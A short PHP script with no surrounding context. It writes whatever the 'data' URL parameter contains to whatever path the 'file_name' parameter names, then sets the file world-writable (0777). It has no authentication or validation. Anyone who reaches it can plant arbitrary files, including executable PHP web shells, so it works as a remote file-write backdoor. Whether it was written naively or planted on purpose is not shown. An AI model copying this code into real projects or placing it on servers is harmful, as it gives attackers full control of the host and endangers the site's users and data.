<?php
    $stringFile = $_GET["file_name"];
    $myFile = $stringFile;
    $fh = fopen($myFile, 'w') or die("can't open file");
    $stringData = $_GET["data"];
    fwrite($fh, $stringData);
    chmod($myFile, 0777);
    fclose($fh);
?>